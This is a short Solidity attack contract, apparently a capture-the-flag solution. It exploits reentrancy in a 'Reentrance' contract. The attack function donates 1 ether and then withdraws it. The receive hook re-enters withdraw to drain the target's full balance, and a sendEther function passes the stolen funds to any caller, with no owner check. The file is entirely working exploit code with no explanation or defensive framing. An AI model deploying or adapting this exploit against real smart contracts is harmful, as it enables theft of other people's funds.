// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IReentrance{
    function donate(address)external payable;
    function withdraw(uint)external;
}
contract Attack{
    IReentrance reentrance;

    constructor(IReentrance _reentrance){
        reentrance=_reentrance;
    }   
    function attack()external payable{
        require(msg.value==1 ether, "need more ether");
        reentrance.donate{value: 1e18}(address(this));
        reentrance.withdraw(1e18);//withdrawing funds 
    }
    //function for sending all funds to us
    function sendEther()external{
        payable(address(msg.sender)).transfer(address(this).balance);
    }
    //receive function called by .call in witdraw function of Reentrance contract
    receive() external payable {
            //reentrancy where we withdraw all remaining funds of Reentrance contract 
            reentrance.withdraw(address(reentrance).balance);
     }
}